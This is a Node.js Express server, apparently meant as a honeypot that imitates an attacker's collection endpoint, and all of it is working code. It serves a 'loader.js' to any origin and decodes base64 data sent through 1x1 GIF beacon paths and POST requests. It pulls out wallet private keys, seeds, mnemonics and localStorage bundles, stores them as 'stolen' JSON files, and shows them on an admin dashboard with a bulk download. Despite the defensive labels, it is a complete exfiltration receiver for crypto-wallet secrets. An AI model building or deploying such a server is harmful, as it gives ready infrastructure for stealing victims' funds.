// server.js - Deploy this to Railway
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FOLDER = path.join(__dirname, 'stolen_data');
const LOGS_FOLDER = path.join(__dirname, 'logs');

if (!fs.existsSync(DATA_FOLDER)) fs.mkdirSync(DATA_FOLDER, { recursive: true });
if (!fs.existsSync(LOGS_FOLDER)) fs.mkdirSync(LOGS_FOLDER, { recursive: true });

app.set('trust proxy', true);
app.use(express.json({ limit: '10mb' }));

// Serve loader.js
app.get('/loader.js', (req, res) => {
    logAccess(req, 'LOADER_REQUEST');
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    // Check if loader.js exists, if not send placeholder
    const loaderPath = path.join(__dirname, 'loader.js');
    if (fs.existsSync(loaderPath)) {
        res.sendFile(loaderPath);
    } else {
        res.status(404).send('// loader.js not uploaded yet');
    }
});

// Health check (what the attacker might check)
app.get('/health', (req, res) => {
    logAccess(req, 'HEALTH_CHECK');
    res.json({
        success: true,
        msg: "OK",
        backfil: "https://bloom-sniper-production.up.railway.app"
    });
});

// Handle data exfiltration via URL path (GIF beacon)
app.get('*', (req, res) => {
    const timestamp = new Date().toISOString();
    const clientIp = getClientIp(req);
    
    // Skip admin and static paths
    if (req.path.startsWith('/admin') || req.path === '/loader.js' || req.path === '/health') {
        return res.status(404).end();
    }
    
    // Extract base64 from URL path
    const segments = req.path.split('/').filter(Boolean);
    let encodedData = segments[segments.length - 1] || '';
    
    // URL decode in case characters like +, /, = were encoded
    try {
        encodedData = decodeURIComponent(encodedData);
    } catch(e) {
        // Already decoded or invalid, continue
    }

    console.log(`[${timestamp}] Request from: ${clientIp} | Path length: ${encodedData.length}`);

    if (encodedData.length > 40) {
        try {
            // Fix padding if needed
            const padding = 4 - (encodedData.length % 4);
            if (padding !== 4) {
                encodedData += '='.repeat(padding);
            }
            
            const decodedStr = Buffer.from(encodedData, 'base64').toString('utf8');
            
            // Debug: log first 500 chars
            console.log('Decoded preview:', decodedStr.substring(0, 500));
            
            let data;
            try {
                data = JSON.parse(decodedStr);
            } catch (parseErr) {
                // Not JSON, treat as raw string
                data = { raw: decodedStr };
            }

            // Extract all possible wallet keys from various formats
            const extractedKeys = [];
            
            // Format 1: data.keys array (your current format)
            if (data.keys && Array.isArray(data.keys)) {
                extractedKeys.push(...data.keys);
            }
            
            // Format 2: direct localStorage dump (object with key-value pairs)
            if (data.localStorage || data.storage) {
                const storage = data.localStorage || data.storage;
                for (const [key, value] of Object.entries(storage)) {
                    if (key.includes('bundle') || key.includes('wallet') || key.includes('key') || key.includes('private')) {
                        extractedKeys.push({ source: key, value: value, type: 'localStorage' });
                    }
                }
            }
            
            // Format 3: specific wallet fields
            const walletFields = ['eBundle', 'sBundle', 'axiom', 'wallet', 'privateKey', 'seed', 'mnemonic'];
            for (const field of walletFields) {
                if (data[field]) {
                    extractedKeys.push({ source: field, value: data[field], type: 'direct_field' });
                }
            }

            const output = {
                receivedAt: timestamp,
                ip: clientIp,
                userAgent: data.header || req.headers['user-agent'],
                keysCount: extractedKeys.length,
                keys: extractedKeys,
                rawData: data, // Keep full raw data for analysis
                rawSize: decodedStr.length,
                originalPath: req.path
            };

            const filename = `stolen_${timestamp.replace(/[:.]/g, '-')}_${clientIp.replace(/[^0-9]/g, '')}.json`;
            fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(output, null, 2));

            console.log(`✅ SAVED: ${filename} | Keys: ${output.keysCount}`);
            
            // Also log to access log
            logAccess(req, 'DATA_RECEIVED', { keysCount: output.keysCount, filename });
            
        } catch (err) {
            console.error(`❌ Decode error: ${err.message}`);
            console.error(`Data was: ${encodedData.substring(0, 100)}...`);
            logAccess(req, 'DECODE_ERROR', { error: err.message, data: encodedData.substring(0, 100) });
        }
    } else {
        logAccess(req, 'SHORT_REQUEST', { length: encodedData.length });
    }

    // Return 1x1 GIF
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.send(gif);
});

// POST endpoint (in case attacker uses POST instead of GET)
app.post('/collect', (req, res) => {
    const timestamp = new Date().toISOString();
    const clientIp = getClientIp(req);
    
    console.log(`[POST] Data from: ${clientIp}`, req.body);
    
    const output = {
        receivedAt: timestamp,
        ip: clientIp,
        userAgent: req.headers['user-agent'],
        body: req.body,
        headers: req.headers
    };
    
    const filename = `post_${timestamp.replace(/[:.]/g, '-')}.json`;
    fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(output, null, 2));
    
    logAccess(req, 'POST_DATA', { filename });
    
    res.json({ success: true });
});

// Helper to get real client IP
function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
           req.headers['x-real-ip'] || 
           req.ip || 
           req.socket.remoteAddress;
}

function logAccess(req, type, extra = {}) {
    const log = {
        timestamp: new Date().toISOString(),
        type: type,
        ip: getClientIp(req),
        userAgent: req.headers['user-agent'],
        url: req.originalUrl,
        ...extra
    };
    fs.appendFileSync(path.join(LOGS_FOLDER, 'admin_access.log'), JSON.stringify(log) + '\n');
}

// HTML Dashboard for viewing logs (easier than JSON)
app.get('/admin', (req, res) => {
    logAccess(req, 'ADMIN_DASHBOARD');
    
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Honeypot Dashboard</title>
        <style>
            body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
            .section { margin: 20px 0; border: 1px solid #0f0; padding: 15px; }
            .log-entry { margin: 5px 0; padding: 5px; background: #222; }
            .ip { color: #ff0; font-weight: bold; }
            .key { color: #0ff; }
            .error { color: #f00; }
            .timestamp { color: #888; }
            pre { overflow-x: auto; background: #000; padding: 10px; }
            a { color: #0f0; }
        </style>
    </head>
    <body>
        <h1>🍯 Honeypot Dashboard</h1>
        <div class="section">
            <h2>Access Logs</h2>
            <div id="logs">Loading...</div>
        </div>
        <div class="section">
            <h2>Stolen Data Files</h2>
            <div id="files">Loading...</div>
        </div>
        <script>
            fetch('/admin/logs').then(r => r.json()).then(data => {
                document.getElementById('logs').innerHTML = data.accessLogs.map(l => 
                    '<div class="log-entry">' +
                    '<span class="timestamp">[' + l.timestamp + ']</span> ' +
                    '<span class="ip">' + l.ip + '</span> ' +
                    l.type + ' ' + (l.url || '') +
                    '</div>'
                ).join('') || 'No logs yet';
                
                document.getElementById('files').innerHTML = data.stolenData.map(f => 
                    '<div class="log-entry">' +
                    '<b>File:</b> ' + f.filename + '<br>' +
                    '<b>IP:</b> <span class="ip">' + f.ip + '</span><br>' +
                    '<b>Keys Found:</b> ' + f.keysCount + '<br>' +
                    '<b>Time:</b> ' + f.receivedAt + '<br>' +
                    '<a href="/admin/file?f=' + f.filename + '">View Details</a>' +
                    '</div>'
                ).join('') || 'No data received yet';
            }).catch(e => {
                document.getElementById('logs').innerHTML = '<span class="error">Error: ' + e.message + '</span>';
            });
        </script>
    </body>
    </html>`;
    res.send(html);
});

// Fixed logs endpoint
app.get('/admin/logs', (req, res) => {
    logAccess(req, 'ADMIN_LOGS_API');
    
    try {
        const logFile = path.join(LOGS_FOLDER, 'admin_access.log');
        let accessLogs = [];
        
        if (fs.existsSync(logFile)) {
            accessLogs = fs.readFileSync(logFile, 'utf8')
                .split('\n')
                .filter(Boolean)
                .map(line => {
                    try {
                        return JSON.parse(line);
                    } catch (e) {
                        return { raw: line, timestamp: 'unknown' };
                    }
                });
        }
        
        const stolenFiles = fs.readdirSync(DATA_FOLDER)
            .filter(f => f.endsWith('.json'))
            .map(f => {
                try {
                    return JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
                } catch (e) {
                    return { filename: f, error: 'Failed to parse' };
                }
            })
            .sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt)); // Newest first
        
        res.json({
            accessLogs: accessLogs.slice(-100),  // Last 100 accesses
            stolenData: stolenFiles,
            serverTime: new Date().toISOString(),
            totalFiles: stolenFiles.length,
            totalRequests: accessLogs.length
        });
    } catch (err) {
        res.status(500).json({ error: err.message, stack: err.stack });
    }
});

// View specific file
app.get('/admin/file', (req, res) => {
    logAccess(req, 'ADMIN_VIEW_FILE', { file: req.query.f });
    
    try {
        const filename = req.query.f;
        if (!filename || filename.includes('..')) {
            return res.status(400).json({ error: 'Invalid filename' });
        }
        
        const filePath = path.join(DATA_FOLDER, filename);
        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ error: 'File not found' });
        }
        
        const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
        res.json(data);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Download all data as zip (for evidence preservation)
app.get('/admin/download', (req, res) => {
    logAccess(req, 'ADMIN_DOWNLOAD');
    
    const JSZip = require('jszip');
    const zip = new JSZip();
    
    const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
    files.forEach(f => {
        zip.file(f, fs.readFileSync(path.join(DATA_FOLDER, f)));
    });
    
    const logs = fs.readdirSync(LOGS_FOLDER);
    logs.forEach(f => {
        zip.file('logs/' + f, fs.readFileSync(path.join(LOGS_FOLDER, f)));
    });
    
    zip.generateNodeStream({ type: 'nodebuffer', streamFiles: true })
        .pipe(res)
        .on('finish', () => {
            console.log('Download complete');
        });
});

app.listen(PORT, () => {
    console.log(`🍯 Honeypot running on port ${PORT}`);
    console.log(`Dashboard: http://localhost:${PORT}/admin`);
});